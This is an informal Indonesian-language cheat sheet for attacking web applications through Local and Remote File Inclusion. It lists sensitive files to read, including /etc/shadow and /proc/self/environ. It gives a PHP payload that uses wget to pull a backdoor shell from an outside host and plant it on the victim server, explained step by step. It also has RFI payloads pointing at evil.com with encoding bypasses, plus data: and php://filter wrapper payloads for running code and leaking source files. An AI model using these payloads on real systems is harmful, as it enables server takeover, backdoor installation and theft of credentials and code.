### Local File Inclusion

<p align="center">
<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png">

<b><p>Basic Local File Inclusion</p></b>
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```

### LFI Reserve Shell

Kita Perlu Collab Ama Bug Lain Gan Yaitu RCE
Dengan Ada Nya Bug RCE Kita Bisa Up Shell:v

Dengan Command wget cuk:v

Oke Kita Check /proc/self/environ dulu

```
http://site.com/index.php?page=/prov/self/environ
```
Simpel Aja Sih Jika Tereksekusi Maka Bisa Kita
Melakukan Up Shell...

Oke Perintah Nya Kayak Gini :
```
<?system ('wget http://dyan6etar.cf/shell.txt -O namashell.php');?>
```
Untuk Cara Up Shell Nya Check Di Bawah :

👉 [LFI Reserve Shell](https://youtu.be/yHVobQK9Ozo)

### Penjelasan
Oke Aing Jelaskan Dikit Perintah Wget Ini

wget menurut Otak : Menarik File Dari Luar Server Cuk Dan Membuatnya Di Dalam Server

-O Untuk Menamakan Nama File Nya 

Nah Ini http://dyan6etar.cf/shell.txt Adalah Shell BackDoor Yang Sudah Di Upload Ke Hosting Atau Pastebin Dengan Extensi txt

namashell.php Bisa Kalian Ubah Sesuka Hati 

Dan Jika Sudah Kita Bisa Langsung Akses Di Dokument root atau di parameter nya cuk

contoh dokumen root : site.com/namashell.php

di parameter : site.com/index?page=namashell.php

### Remote File Inclusion

Basic And Bypass 
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```
### RFI // LFI To XSS Via Payload
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```
note : Base64 Nya Lu Bisa Ubah Sendiri Encode / Decode Sendiri , ok?

### RFI // LFI WRAPPERS
```
http://site.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```
Note : Untuk Bagian Ujung Kan Ada index.php Lu Bisa Ganti ,Ok? Example : page.php , admin.php , database.sql

Jika Ada Muncul Base64 Lu Decode Aja Dan Liat Isi Dari File Tersebut

Oke Next Gua Bakalan Bahas Basic Remote Code Execution , Babay!!
